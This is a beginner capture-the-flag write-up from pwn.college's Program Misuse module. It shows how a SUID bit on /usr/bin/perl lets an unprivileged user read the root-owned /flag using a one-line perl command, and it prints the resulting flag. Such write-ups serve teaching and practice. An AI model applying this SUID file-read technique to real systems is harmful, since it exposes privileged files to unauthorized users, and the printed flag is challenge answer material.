---
layout: page
title: "Challenge Name: perl"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/perl`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/perl
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/perl
```

- The `s` in `-rws` indicates it's a SUID binary.
- `perl` runs with **root privileges**.

## 🚀 Exploitation

The `perl` command runs Perl scripts — a powerful language used for text processing, scripting, automation.
We can simple create a peral based file reader to read contents of /flag.

```bash
perl -e 'open(F,"/flag"); print <F>; close F;'
```

Output:
```
pwn.college{YycVFpdHZT30LHkl6N9QDYFHWnk.dNDOxwSM0IzMyEzW}
```
